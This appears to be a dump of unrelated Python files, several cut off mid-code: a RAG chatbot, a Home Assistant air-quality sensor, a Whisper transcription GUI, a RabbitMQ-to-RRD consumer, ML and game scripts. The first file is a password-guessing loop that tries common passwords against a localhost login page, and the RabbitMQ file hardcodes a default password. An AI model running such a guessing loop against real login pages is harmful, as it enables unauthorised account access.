    "import requests\r\n\r\nurl = \"http://localhost:8080/login\"  # Target URL for the login page\r\nusername = \"administrator_\"  # Username to use in the login attempt\r\npassword_list = [\r\n    '123456', 'password', 'admin123', 'welcome', 'admin_123', 'letmein', 'admin', 'password1'\r\n    # Add more passwords to the list as needed\r\n]\r\n\r\nfor password in password_list:\r\n    data = {\"username\": username, \"password\": password}  # Data payload for the POST request\r\n    response = requests.post(url, data=data)  # Send the POST request to the server\r\n    \r\n    print(f\"Testing password: {password}\")\r\n    print(f\"Response Status Code: {response.status_code}\")\r\n    print(f\"Response Text: {response.text}\\n\")\r\n\r\n    if response.status_code == 200 and \"Welcome\" in response.text:\r\n        print(f\"Login successful! Access granted with username: {username} and password: {password}\")\r\n        break  # Exit the loop once the correct password is found\r\n    else:\r\n        print(f\"Login failed for username: {username} with password: {password}\")  # Optional: Print failed attempts\r\n",
    "\"\"\"\nStreamlit app for chat-based RAG interactions.\n\"\"\"\nimport streamlit as st\nfrom rag_query import RAGQueryEngine\nimport os\nfrom dotenv import load_dotenv\n\n# Load environment variables\nload_dotenv()\n\n# Initialize session state for chat history\nif \"messages\" not in st.session_state:\n    st.session_state.messages = []\n\ndef initialize_rag_engine():\n    \"\"\"Initialize the RAG engine with Pinecone.\"\"\"\n    return RAGQueryEngine(\n        index_name=\"web-page-rag\",\n        model_name=\"gpt-3.5-turbo\",\n        temperature=0.7\n    )\n\n# App title and description\nst.title(\"Ask me anything about the wedding\")\nst.caption(\"Ask questions about the content from sanantonesklars.com\")\n\n# Initialize RAG engine\nrag_engine = initialize_rag_engine()\n\n# Display chat messages\nfor message in st.session_state.messages:\n    with st.chat_message(message[\"role\"]):\n        st.markdown(message[\"content\"])\n        if \"sources\" in message and message[\"sources\"]:\n            with st.expander(\"View Sources\"):\n                for i, source in enumerate(message[\"sources\"], 1):\n                    st.markdown(f\"{i}. {source}\")\n\n# Chat input\nif prompt := st.chat_input(\"Ask a question about the website...\"):\n    # Add user message to chat history\n    st.session_state.messages.append({\"role\": \"user\", \"content\": prompt})\n    \n    # Display user message\n    with st.chat_message(\"user\"):\n        st.markdown(prompt)\n    \n    # Get AI response\n    with st.chat_message(\"assistant\"):\n        with st.spinner(\"Thinking...\"):\n            response = rag_engine.query(prompt)\n            answer = response[\"answer\"]\n            sources = [doc.metadata.get('source', 'Unknown source') \n                      for doc in response[\"source_documents\"]]\n            \n            # Display response\n            st.markdown(answer)\n            if sources:\n                with st.expander(\"View Sources\"):\n                    for i, source in enumerate(sources, 1):\n                        st.markdown(f\"{i}. {source}\")\n            \n            # Add assistant message to chat history\n            st.session_state.messages.append({\n                \"role\": \"assistant\",\n                \"content\": answer,\n                \"sources\": sources\n            }) ",
    "from homeassistant.components.air_quality import AirQualityEntity\nfrom homeassistant.config_entries import ConfigEntry\nfrom homeassistant.core import HomeAssistant\nfrom homeassistant.helpers.aiohttp_client import async_get_clientsession\nfrom datetime import datetime, timedelta, timezone\nimport logging\nimport asyncio\n\n_LOGGER = logging.getLogger(__name__)\n\nAPI_URL = \"https://airquality.googleapis.com/v1/currentConditions:lookup\"\nFORECAST_URL = \"https://airquality.googleapis.com/v1/forecast:lookup\"\nSCAN_INTERVAL = timedelta(hours=3)\n\n\nclass GoogleAQIAirQualityEntity(AirQualityEntity):\n    \"\"\"Representation of a Google AQI air quality entity.\"\"\"\n\n    def __init__(\n        self,\n        hass,\n        api_key,\n        latitude,\n        longitude,\n        get_additional_info,\n        update_interval,\n        forecast_interval,\n        forecast_length,\n    ):\n        self.hass = hass\n        self._api_key = api_key\n        self._latitude = latitude\n        self._longitude = longitude\n        self._get_additional_info = get_additional_info\n        self._update_interval = update_interval\n        self._forecast_interval = forecast_interval\n        self._forecast_length = forecast_length\n\n        self._state = None\n        self._attributes = {}\n        self._pollutants = {}\n        self._indices = []\n        self._forecast = []\n        # self._pm25 = None  # Tracks PM2.5 state\n\n        # Timestamps and statuses\n        self._last_current_api_call = None\n        self._next_current_api_call = None\n        self._current_api_status = None\n        self._last_forecast_api_call = None\n        self._next_forecast_api_call = None\n        self._forecast_api_status = None\n\n    @property\n    def name(self):\n        \"\"\"Return the name of the sensor.\"\"\"\n        return \"Google AQI Sensor\"\n\n    @property\n    def state(self):\n        \"\"\"Return the current PM2.5 value as the state.\"\"\"\n        return self._pm25\n\n    @property\n    def extra_state_attributes(self):\n        \"\"\"Return additional state attributes.\"\"\"\n        attributes = {\n            \"region\": self._attributes.get(\"region\"),\n            \"last_update\": self._attributes.get(\"last_update\"),\n            \"forecast\": self._forecast,\n            \"last_current_api_call\": self._last_current_api_call,\n            \"next_current_api_call\": self._next_current_api_call,\n            \"current_api_status\": self._current_api_status,\n            \"last_forecast_api_call\": self._last_forecast_api_call,\n            \"next_forecast_api_call\": self._next_forecast_api_call,\n            \"forecast_api_status\": self._forecast_api_status,\n        }\n\n        # Include air quality indices\n        for index in self._indices:\n            attributes[f\"index_{index['code']}\"] = {\n                \"aqi\": index.get(\"aqi\"),\n                \"category\": index.get(\"category\"),\n                \"dominant_pollutant\": index.get(\"dominantPollutant\"),\n            }\n\n        # Include pollutants\n        for pollutant, details in self._pollutants.items():\n            pollutant_data = {\n                \"value\": details.get(\"value\"),\n                \"unit\": details.get(\"units\"),\n            }\n            if self._get_additional_info:\n                pollutant_data.update(\n                    {\n                        \"sources\": details.get(\"sources\"),\n                        \"effects\": details.get(\"effects\"),\n                    }\n                )\n            attributes[pollutant] = pollutant_data\n\n        return attributes\n\n    @property\n    def particulate_matter_2_5(self):\n        \"\"\"Return the PM2.5 value.\"\"\"\n        return self._pollutants.get(\"pm25\", {}).get(\"value\")\n\n    @property\n    def particulate_matter_10(self):\n        \"\"\"Return the PM10 value.\"\"\"\n        return self._pollutants.get(\"pm10\", {}).get(\"value\")\n\n    @property\n    def carbon_monoxide(self):\n        \"\"\"Return the CO value.\"\"\"\n        return self._pollutants.get(\"co\", {}).get(\"value\")\n\n    @property\n    def nitrogen_dioxide(self):\n        \"\"\"Return the NO2 value.\"\"\"\n        return self._pollutants.get(\"no2\", {}).get(\"value\")\n\n    @property\n    def ozone(self):\n        \"\"\"Return the O3 value.\"\"\"\n        return self._pollutants.get(\"o3\", {}).get(\"value\")\n\n    @property\n    def sulfur_dioxide(self):\n        \"\"\"Return the SO2 value.\"\"\"\n        return self._pollutants.get(\"so2\", {}).get(\"value\")\n\n    async def async_update(self):\n        \"\"\"Fetch both current and forecast data with optimized API calls.\"\"\"\n        now = datetime.now()\n        self._next_current_api_call = now + timedelta(hours=self._update_interval)\n        self._next_forecast_api_call = now + timedelta(hours=self._forecast_interval)\n\n        tasks = [self._fetch_current_data()]\n\n        if (\n            not self._last_forecast_api_call\n            or now - self._last_forecast_api_call\n            > timedelta(hours=self._forecast_interval)\n        ):\n            tasks.append(self._fetch_forecast_data())\n\n        await asyncio.gather(*tasks)\n\n    def _should_update_forecast(self):\n        \"\"\"",
    "import tkinter as tk\nfrom tkinter import filedialog\nimport torch\nimport whisper\nimport sounddevice as sd\nimport numpy as np\nimport threading\nimport queue\nimport pyperclip\nimport wave\nimport librosa\nimport datetime\n\n# Check for GPU, prefer CUDA if available\nDEVICE = \"cuda\" if torch.cuda.is_available() else \"cpu\"\n\n# Load Whisper model\nMODEL = whisper.load_model(\"large\", device=DEVICE)\n\n# Queue for audio data\naudio_queue = queue.Queue()\n\n# Transcription thread flag\nrunning = False\n\n# Buffer to store audio chunks\naudio_buffer = []\nBUFFER_DURATION = 5  # Minimum duration of audio (in seconds) to transcribe\n\ndef record_audio():\n    \"\"\"Record audio and add it to the queue.\"\"\"\n    global running, audio_buffer\n    samplerate = 16000  # Whisper expects 16kHz\n\n    def callback(indata, frames, time, status):\n        global audio_buffer  # Ensure we use the global variable\n        if running:\n            if status:\n                print(f\"Audio input error: {status}\")\n            audio_buffer.append(indata.copy())\n\n            # If buffer reaches the required duration, enqueue data\n            if len(audio_buffer) * frames >= samplerate * BUFFER_DURATION:\n                audio_data = np.concatenate(audio_buffer, axis=0)\n                audio_queue.put(audio_data)\n                audio_buffer = []  # Clear the buffer\n\n    with sd.InputStream(samplerate=samplerate, channels=1, callback=callback):\n        while running:\n            sd.sleep(1000)  # Sleep for 1 second\n\ndef save_audio_to_file(audio_data, filename=\"debug_audio.wav\"):\n    \"\"\"Save audio data to a WAV file for debugging.\"\"\"\n    with wave.open(filename, \"wb\") as wf:\n        wf.setnchannels(1)  # Mono\n        wf.setsampwidth(2)  # 16-bit audio\n        wf.setframerate(16000)  # 16kHz\n        wf.writeframes(audio_data.tobytes())\n\ndef transcribe_audio(output_file, text_widget):\n    \"\"\"Continuously transcribe audio from the queue.\"\"\"\n    global running\n    transcription = \"\"\n    with open(output_file, \"a\", encoding=\"utf-8\") as f:\n        while running:\n            try:\n                audio_chunk = audio_queue.get(timeout=10)\n                audio_data = np.squeeze(audio_chunk)\n\n                print(f\"Audio chunk size: {audio_data.size}\")  # Log the size of the audio data\n\n                # Ensure correct format using librosa\n                audio_data = librosa.resample(audio_data.astype(np.float32), orig_sr=16000, target_sr=16000)\n\n                # Save audio for debugging (optional)\n                save_audio_to_file(np.int16(audio_data * 32767), filename=\"debug_audio.wav\")\n\n                # Transcribe using Whisper\n                result = MODEL.transcribe(audio_data, fp16=torch.cuda.is_available(), language=\"de\")\n                text = result[\"text\"].strip()\n\n                # Handle empty or invalid transcription\n                if not text:\n                    text = \"(Unklarer Text erkannt)\"\n\n                # Update the GUI\n                text_widget.insert(tk.END, text + \"\\n\")\n                text_widget.see(tk.END)\n\n                # Append to transcription\n                transcription += text + \"\\n\"\n\n                # Write to file\n                f.write(text + \"\\n\")\n                f.flush()\n            except queue.Empty:\n                continue\n            except Exception as e:\n                print(f\"Error during transcription: {e}\")\n    # Copy complete transcription to clipboard\n    pyperclip.copy(transcription)\n\ndef start_transcription(text_widget, start_button, stop_button):\n    \"\"\"Start recording and transcription.\"\"\"\n    global running\n    if not running:\n        running = True\n        start_button.config(state=tk.DISABLED)\n        stop_button.config(state=tk.NORMAL)\n\n        # Generate unique output file name\n        timestamp = datetime.datetime.now().strftime(\"%Y_%m_%d_%H_%M_%S\")\n        output_file = f\"transcription_{timestamp}.txt\"\n\n        # Start threads for recording and transcription\n        threading.Thread(target=record_audio, daemon=True).start()\n        threading.Thread(target=transcribe_audio, args=(output_file, text_widget), daemon=True).start()\n\ndef stop_transcription(start_button, stop_button):\n    \"\"\"Stop recording and transcription.\"\"\"\n    global running\n    running = False\n    start_button.config(state=tk.NORMAL)\n    stop_button.config(state=tk.DISABLED)\n\ndef main():\n    \"\"\"Main function to set up the GUI.\"\"\"\n    # Create the GUI window\n    root = tk.Tk()\n    root.title(\"Live Transcription\")\n\n    # Title label\n    title_label = tk.Label(root, text=\"Askleion Live Transkription\", font=(\"Helvetica\", 16, \"bold\"))\n    title_label.pack(pady=10)\n\n    # Text widget to display transcription\n    text_widget = tk.Text(root, wrap=tk.WORD, height=20, width=80)\n    text_widget.pack(padx=10, pady=10)\n\n    # Buttons\n    button_frame = tk.Frame(root)\n    button_frame.pack(pady=10)\n\n    start_button = tk.Button(button_frame, text=\"Start\", width=10, \n                              command=lambda: start_transcription(text_widget, start_but",
    "import pika\nimport os\nimport logging\nimport json\nimport time\nimport rrdtool\n\n# Configure structured logging\nclass JsonFormatter(logging.Formatter):\n    def format(self, record):\n        log_record = {\n            \"timestamp\": self.formatTime(record),\n            \"level\": record.levelname,\n            \"message\": record.getMessage(),\n            \"service\": \"rrd-reader-service\",\n        }\n        return json.dumps(log_record)\n\nlogger = logging.getLogger()\nhandler = logging.StreamHandler()\nhandler.setFormatter(JsonFormatter())\nlogger.addHandler(handler)\nlogger.setLevel(logging.INFO)\n\n# RabbitMQ Configuration\nRABBITMQ_HOST = os.getenv('RABBITMQ_HOST', 'rabbitmq.signalwave.svc.cluster.local')\nRABBITMQ_PORT = int(os.getenv('RABBITMQ_PORT', '5672'))\nRABBITMQ_USER = os.getenv('RABBITMQ_USER', 'deploy')\nRABBITMQ_PASS = os.getenv('RABBITMQ_PASS', 'VMware123!')\nQUEUE_NAME = os.getenv('RABBITMQ_QUEUE', 'signalwave')\n\ncredentials = pika.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)\n\n# Define RRDtool settings\nRRD_FOLDER = \"/app/rrd_files\"\nos.makedirs(RRD_FOLDER, exist_ok=True)\n\ndef create_rrd(metric_name):\n    rrd_file = os.path.join(RRD_FOLDER, f\"{metric_name}.rrd\")\n    if not os.path.exists(rrd_file):\n        logger.info(f\"Creating RRD database for metric: {metric_name}\")\n        rrdtool.create(\n            rrd_file,\n            \"--step\", \"300\",  # 5-minute intervals\n            \"DS:value:GAUGE:600:U:U\",  # Data source with unknown min/max\n            \"RRA:AVERAGE:0.5:1:288\",  # Retain 1-day data at 5-min resolution\n            \"RRA:AVERAGE:0.5:12:168\"  # Retain 1-week data at 1-hour resolution\n        )\n    return rrd_file\n\ndef update_rrd(metric_name, value, timestamp):\n    rrd_file = create_rrd(metric_name)\n    try:\n        # Fetch the last update time for the RRD\n        last_update = int(rrdtool.info(rrd_file).get(\"last_update\", 0))\n        if timestamp <= last_update:\n            logger.warning(f\"Adjusting timestamp for {metric_name} from {timestamp} to {last_update + 1}\")\n            timestamp = last_update + 1\n\n        # Update the RRD database with the adjusted timestamp\n        rrdtool.update(rrd_file, f\"{int(timestamp)}:{value}\")\n        logger.info(f\"Updated RRD for {metric_name} with value {value} at {timestamp}\")\n    except Exception as e:\n        logger.error(f\"Error updating RRD for {metric_name}: {e}\")\n\ndef process_messages():\n    logger.info(\"Starting to process RabbitMQ messages...\")\n    try:\n        connection = pika.BlockingConnection(pika.ConnectionParameters(\n            host=RABBITMQ_HOST, port=RABBITMQ_PORT, credentials=credentials))\n        channel = connection.channel()\n        channel.queue_declare(queue=QUEUE_NAME, durable=True, arguments={\"x-queue-type\": \"quorum\"})\n        logger.info(\"Successfully connected to RabbitMQ and declared queue\")\n\n        for method, properties, body in channel.consume(queue=QUEUE_NAME, inactivity_timeout=10):\n            if body is None:\n                break  # Exit consume after inactivity timeout\n            try:\n                message = json.loads(body)\n                timestamp = int(time.mktime(time.strptime(message[\"timestamp\"], \"%Y-%m-%d %H:%M:%S\")))\n                metrics = message[\"metrics\"]\n                for metric_name, value in metrics.items():\n                    if value is not None:  # Ensure value is not None\n                        update_rrd(metric_name, value, timestamp)\n                channel.basic_ack(method.delivery_tag)\n            except Exception as e:\n                logger.error(f\"Error processing message: {e}\")\n    except Exception as e:\n        logger.error(f\"Error connecting to RabbitMQ: {e}\")\n    finally:\n        if 'connection' in locals() and connection.is_open:\n            connection.close()\n\ndef main():\n    logger.info(\"Starting RRD Reader Service...\")\n    while True:\n        process_messages()\n        logger.info(\"Sleeping for 5 minutes before next iteration...\")\n        time.sleep(300)  # Sleep for 5 minutes\n\nif __name__ == \"__main__\":\n    main()\n",
    "\nimport os\n\nfrom detectron2.data import DatasetCatalog, MetadataCatalog\nfrom detectron2.data.datasets import load_sem_seg\nfrom detectron2.utils.colormap import colormap\n\nCLASSES = (\n    'unlabeled', 'road', 'sidewalk', 'building', 'wall', 'fence', 'pole', 'traffic light', 'traffic sign',\n    'vegetation', 'terrain', 'sky', 'person', 'rider', 'car', 'truck', 'bus', 'train',\n    'motorcycle', 'bicycle',\n)\n\n\ndef register_dataset(root):\n    ds_name = 'dark_zurich'\n    root = os.path.join(root, 'Dark_Zurich')\n\n    for split, image_dirname, sem_seg_dirname, class_names in [\n        ('val', 'rgb_anon/val/night/GOPR0356', 'annotations_detectron2/val', CLASSES),\n    ]:\n        image_dir = os.path.join(root, image_dirname)\n        gt_dir = os.path.join(root, sem_seg_dirname)\n        full_name = f'{ds_name}_sem_seg_{split}'\n        DatasetCatalog.register(\n            full_name,\n            lambda x=image_dir, y=gt_dir: load_sem_seg(\n                y, x, gt_ext='_gt_labelIds.png', image_ext='_rgb_anon.png'\n            ),\n        )\n        MetadataCatalog.get(full_name).set(\n            image_root=image_dir,\n            sem_seg_root=gt_dir,\n            evaluator_type='sem_seg',\n            ignore_label=255,\n            stuff_classes=class_names,\n            stuff_colors=colormap(rgb=True),\n            classes_of_interest=list(range(1, len(class_names))),\n            background_class=0,\n        )\n\n\n_root = os.getenv('DETECTRON2_DATASETS', 'datasets')\nregister_dataset(_root)\n",
    "import numpy as np\nimport torch\nimport pyro\nimport pyro.distributions as dist\nfrom pyro.infer import MCMC, NUTS\n# import pandas as pd\nimport seaborn as sns\nimport matplotlib.pyplot as plt\nfrom sklearn.decomposition import PCA\nfrom sklearn.model_selection import train_test_split\nfrom datasets import load_dataset\nfrom transformers import AutoTokenizer, AutoModel\nimport os\nimport time\n\nos.environ[\"TOKENIZERS_PARALLELISM\"] = \"false\"\n\nnp.random.seed(42)\ntorch.manual_seed(42)\n\ndef load_data(sample_ratio=0.01):\n    \"\"\"\n    Load a subset of the Yelp Polarity dataset.\n    Change `sample_ratio` to process more data once testing is complete.\n    \"\"\"\n    print(\"Loading dataset...\")\n    split = f\"train[:{int(sample_ratio * 100)}%]\"\n    if int(sample_ratio * 100) == 0:\n        raise ValueError(\"sample_ratio too small, resulting in no data!\")\n    return load_dataset(\"yelp_polarity\", split=split)\n\ndef extract_features(text, tokenizer, model):\n    \"\"\"\n    Extract features from text using a pre-trained BERT model.\n    \"\"\"\n    tokens = tokenizer(text, return_tensors=\"pt\", truncation=True, padding=True, max_length=128)\n    with torch.no_grad():\n        outputs = model(**tokens)\n        embeddings = outputs.last_hidden_state.mean(dim=1)\n    return embeddings.squeeze(0).numpy()\n\ndef preprocess_data(dataset, tokenizer, model, pca_components=10):\n    \"\"\"\n    Preprocess dataset to extract features, reduce dimensionality, and prepare labels.\n    \"\"\"\n    Z, X, Y = [], [], []\n    start_time = time.time()\n    print(\"Extracting features...\")\n    for i, item in enumerate(dataset):\n        try:\n            embedding = extract_features(item['text'], tokenizer, model)\n            Z.append(embedding)\n            X.append(len(item['text'].split()))\n            Y.append(1 if item['label'] == 1 else 0)\n        except Exception as e:\n            print(f\"Error processing item {i}: {e}\")\n            continue\n    end_time = time.time()\n    print(f\"Feature extraction took {end_time - start_time:.2f} seconds\")\n    \n    print(\"Performing PCA on BERT embeddings...\")\n    pca = PCA(n_components=pca_components)\n    Z_reduced = pca.fit_transform(Z)\n    print(f\"Explained variance ratio: {np.sum(pca.explained_variance_ratio_):.2f}\")\n    return np.array(Z_reduced), np.array(X), np.array(Y)\n\ndef causal_model(Z, X, Y=None):\n    \"\"\"\n    alpha = pyro.sample(\"alpha\", dist.Gamma(2.0, 2.0))\n    mean_Y = alpha + beta * X + torch.sum(\n    \"\"\"\n    n_samples, n_covariates = Z.shape\n    alpha = pyro.sample(\"alpha\", dist.Gamma(2.0, 2.0))\n    sigma = pyro.sample(\"sigma\", dist.HalfNormal(1.0))\n    beta = pyro.sample(\"beta\", dist.Normal(0., 1.))\n    mean_Y = beta * X + torch.sum(\n        Z * pyro.sample(\"weights\", dist.Normal(0., 1.).expand([n_covariates]).to_event(1)),\n        dim=1\n    )\n    with pyro.plate(\"data\", n_samples):\n        Y = pyro.sample(\"Y\", dist.Normal(mean_Y, sigma), obs=Y)\n    return Y\n\ndef diagnostics(mcmc):\n    \"\"\"\n    Perform diagnostics on MCMC results, including R-hat and trace plots.\n    \"\"\"\n    print(\"Performing diagnostics...\")\n    mcmc.summary()\n    samples = mcmc.get_samples()\n    \n    # Generate trace plots\n    for param, value in samples.items():\n        plt.figure(figsize=(10, 4))\n        plt.plot(value.numpy(), label=f\"Trace plot for {param}\")\n        plt.legend()\n        plt.show()\n    \n    return samples\n\ndef sensitivity_analysis(Z_test, X_test, samples, Y_test):\n    \"\"\"\n    Perform sensitivity analysis to test robustness of causal estimates.\n    \"\"\"\n    weights_mean = samples['weights'].mean(axis=0)\n    beta_mean = samples['beta'].mean()\n\n    # Predictions with slight perturbations in X\n    perturbed_X = X_test + torch.normal(0, 0.1, size=X_test.size())\n    predictions = beta_mean * perturbed_X + torch.sum(Z_test * weights_mean, axis=1)\n\n    residuals = Y_test.numpy() - predictions.numpy()\n\n    print(\"Sensitivity Analysis - Perturbed Results:\")\n    sns.histplot(residuals, kde=True, color='purple')\n    plt.title('Residual Distribution (Perturbed Test Set)')\n    plt.xlabel('Residual (Actual - Predicted)')\n    plt.ylabel('Density')\n    plt.show()\n\ndef visualize_results(samples, Y_test, predictions):\n    \"\"\"\n    Visualize posterior distributions and residuals for the model's predictions.\n    \"\"\"\n    plt.figure(figsize=(12, 6))\n    sns.histplot(samples['alpha'].numpy(), kde=True, label='alpha', color='blue')\n    sns.histplot(samples['sigma'].numpy(), kde=True, label='sigma', color='green')\n    sns.histplot(samples['beta'].numpy(), kde=True, label='beta', color='red')\n    plt.legend()\n    plt.title('Posterior Distributions of Hyperparameters')\n    plt.xlabel('Value')\n    plt.ylabel('Density')\n    plt.show()\n\n    plt.figure(figsize=(10, 6))\n    sns.scatterplot(x=Y_test.numpy(), y=predictions.numpy(), alpha=0.6)\n    plt.axhline(0.5, color='red', linestyle='--', label='Decision Boundary (0.5)')\n    plt.title('Actual vs Predicted Sentiments (Test Set)')\n    plt.xlabel('Actual Sentiment')\n    plt.ylabel('Predicted Sentiment')\n    plt.legend()\n    plt",
    "# Copyright (c) 2025 Alex Yeryomin\r\n# The demo program for ESP32-\u04213 with OLED display 72x40 pixels.\r\n\r\nfrom machine import Pin, I2C\r\nfrom time import sleep\r\nfrom sh1106 import SH1106_I2C # Install SH1106 driver.\r\nfrom random import randint\r\n\r\ni2c_display = I2C(0, sda=Pin(5), scl=Pin(6), freq=400000)\r\ndisplay = SH1106_I2C(128, 64, i2c_display)\r\ndisplay.contrast(255)\r\n\r\n# SSD1306 controller has 132x64 pixel buffer\r\nBufferWidth, BufferHeight = 132, 64\r\nScreenWidth, ScreenHeight = 72, 40\r\nxOffset, yOffset = (BufferWidth - ScreenWidth) // 2, (BufferHeight - ScreenHeight) // 2\r\n\r\nfor r in range(display.height // 2):\r\n    display.hline(xOffset, yOffset + r * 2, ScreenWidth, 1)\r\n    display.show()\r\nfor c in range(display.width // 2):\r\n    display.vline(xOffset + c * 2, yOffset, ScreenHeight, 1)\r\n    display.show()\r\n\r\nwhile True:\r\n    x, y = randint(0, ScreenWidth - 1), randint(0, ScreenHeight - 1)\r\n    dx, dy = randint(-3, 3), randint(-3, 3)\r\n\r\n    display.invert(0)\r\n    display.fill(0)\r\n\r\n    for _ in range(200):\r\n        display.fill(0)\r\n        display.ellipse(xOffset + x, yOffset + y, 3, 3, 1)\r\n        display.show()\r\n        x += dx\r\n        if x < 0 or x >= ScreenWidth:\r\n            dx = -dx\r\n        y += dy\r\n        if y < 0 or y >= ScreenHeight:\r\n            dy = -dy\r\n        \r\n    for i in range(6):\r\n        display.invert(i % 2)\r\n        display.show()\r\n        sleep(0.2)\r\n \r\n",
    "import streamlit as st\nimport pandas as pd\nfrom components.Clean_Data import Clean_Data\nfrom components.Data import Data\nfrom components.connector import load_csv_from_mongodb, save_files_to_mongodb\n\n# Streamlit App\nst.title(\"Weather Data Processing with MongoDB\")\n\n# Step 1: Upload or Load Data\nst.header(\"Upload or Load Data\")\nfile_source = st.radio(\"Select Data Source:\", (\"Load from MongoDB\", \"Upload CSV\"))\n\nfile_data = None\nif file_source == \"Load from MongoDB\":\n    file_name = \"weatherAUS.csv\"\n    st.write(\"Loading data from MongoDB...\")\n    file_data = load_csv_from_mongodb(file_name)\n    if file_data is not None:\n        st.success(\"Data loaded successfully from MongoDB!\")\n        st.dataframe(file_data.head())\n    else:\n        st.error(\"Failed to load data from MongoDB.\")\n\nelif file_source == \"Upload CSV\":\n    uploaded_file = st.file_uploader(\"Upload your CSV file\", type=\"csv\")\n    if uploaded_file is not None:\n        file_data = pd.read_csv(uploaded_file)\n        st.success(\"CSV file uploaded successfully!\")\n        st.dataframe(file_data.head())\n\n# Proceed if data is available\nif file_data is not None:\n    # Step 2: Clean Data\n    st.header(\"Processing Data\")\n    cleaner = Clean_Data()\n    cleaner.file = file_data\n\n    # Step 4: Identify Column Types\n    st.write(\"Identifying column types...\")\n    numerical_cols, categorical_cols = cleaner.Columns()\n\n    st.write(\"Cleaning data...\")\n    cleaner.Drop_Duplicates()\n    cleaner.Fill_Na()\n\n\n    # Step 3: Split Data\n    st.write(\"Splitting data into train, test, and validation sets...\")\n    train_data, test_data, val_data = cleaner.Data_Seperator()\n\n\n\n    # Step 5: Normalize Data\n    st.write(\"Normalizing numerical data...\")\n    data_processor=Data()\n    normalized_train_data = data_processor.Normalizer(numerical_cols)\n\n    # Save processed data to MongoDB\n    st.write(\"Saving processed data to MongoDB...\")\n    processed_data = {\"train\": train_data, \"test\": test_data, \"val\": val_data}\n    save_files_to_mongodb(processed_data)\n\n    st.success(\"Processed data saved to MongoDB.\")\n\n    # Provide Download Links\n    st.header(\"Download Processed Data\")\n    for dataset_name, dataset in processed_data.items():\n        csv_data = dataset.to_csv(index=False).encode(\"utf-8\")\n        st.download_button(\n            label=f\"Download {dataset_name.capitalize()} Data\",\n            data=csv_data,\n            file_name=f\"{dataset_name}_data.csv\",\n            mime=\"text/csv\",\n        )\n",
    "from random import randrange\r\n\r\n# Constants for board symbols\r\nEMPTY = \" \"\r\nPLAYER_SYMBOL = \"O\"\r\nCOMPUTER_SYMBOL = \"X\"\r\n\r\n\r\ndef display_board(board):\r\n    \"\"\"Displays the current state of the board.\"\"\"\r\n    print(\"+-------\" * 3 + \"+\")\r\n    for row in board:\r\n        print(\"|       \" * 3 + \"|\")\r\n        for cell in row:\r\n            print(f\"|   {cell}   \", end=\"\")\r\n        print(\"|\")\r\n        print(\"|       \" * 3 + \"|\")\r\n        print(\"+-------\" * 3 + \"+\")\r\n\r\n\r\ndef enter_move(board):\r\n    \"\"\"Allows the player to make their move.\"\"\"\r\n    while True:\r\n        try:\r\n            move = int(input(\"\\nEnter your move (1-9): \"))\r\n            if 1 <= move <= 9:\r\n                row, col = divmod(move - 1, 3)\r\n                if board[row][col] == EMPTY:\r\n                    board[row][col] = PLAYER_SYMBOL\r\n                    break\r\n                else:\r\n                    print(\"Field already occupied. Try again.\")\r\n            else:\r\n                print(\"Invalid move. Enter a number between 1 and 9.\")\r\n        except ValueError:\r\n            print(\"Invalid input. Please enter a number.\")\r\n\r\n\r\ndef make_list_of_free_fields(board):\r\n    \"\"\"Returns a list of all free positions on the board.\"\"\"\r\n    return [(row, col) for row in range(3) for col in range(3) if board[row][col] == EMPTY]\r\n\r\n\r\ndef victory_for(board, symbol):\r\n    \"\"\"Checks if the given symbol has won.\"\"\"\r\n    # Check rows and columns\r\n    for i in range(3):\r\n        if all(board[i][j] == symbol for j in range(3)) or all(board[j][i] == symbol for j in range(3)):\r\n            return True\r\n\r\n    # Check diagonals\r\n    if all(board[i][i] == symbol for i in range(3)) or all(board[i][2 - i] == symbol for i in range(3)):\r\n        return True\r\n\r\n    return False\r\n\r\n\r\ndef draw_move(board):\r\n    \"\"\"Makes a random move for the computer.\"\"\"\r\n    free_fields = make_list_of_free_fields(board)\r\n    if free_fields:\r\n        row, col = free_fields[randrange(len(free_fields))]\r\n        board[row][col] = COMPUTER_SYMBOL\r\n\r\nprint (\"\\n..:: This is the game of Tic-Tac-Toe. You play 'O' and I play 'X'.\\n\")\r\nprint (\r\n''' \\t\\t+-------+-------+-------+\r\n    \\t\\t|       |       |       |\r\n    \\t\\t|   1   |   2   |   3   |\r\n    \\t\\t|       |       |       |\r\n    \\t\\t+-------+-------+-------+\r\n    \\t\\t|       |       |       |\r\n    \\t\\t|   4   |   5   |   6   |\r\n    \\t\\t|       |       |       |\r\n    \\t\\t+-------+-------+-------+\r\n    \\t\\t|       |       |       |\r\n    \\t\\t|   7   |   8   |   9   |\r\n    \\t\\t|       |       |       |\r\n    \\t\\t+-------+-------+-------+\r\n''')\r\nprint(\"System will make the first move. Just enter the number of the field you want to occupy.\\n\")\r\n\r\nprint(\"\\n==> Let's start!\\n\")\r\n\r\n# Initialize the board\r\nboard = [[EMPTY for _ in range(3)] for _ in range(3)]\r\nboard[1][1] = COMPUTER_SYMBOL  # Computer starts with the center square\r\n\r\nhuman_turn = True  # Start with the human player's turn\r\n\r\n# Main game loop\r\nwhile True:\r\n    display_board(board)\r\n\r\n    if human_turn:\r\n        enter_move(board)\r\n        if victory_for(board, PLAYER_SYMBOL):\r\n            display_board(board)\r\n            print(\"\\n..:: Congratulations! You won!\\n\")\r\n            break\r\n    else:\r\n        draw_move(board)\r\n        if victory_for(board, COMPUTER_SYMBOL):\r\n            display_board(board)\r\n            print(\"\\n:( Sorry, I won!\\n\")\r\n            break\r\n\r\n    if not make_list_of_free_fields(board):\r\n        display_board(board)\r\n        print(\"\\n:) It's a draw!\\n\")\r\n        break\r\n\r\n    human_turn = not human_turn\r\n",
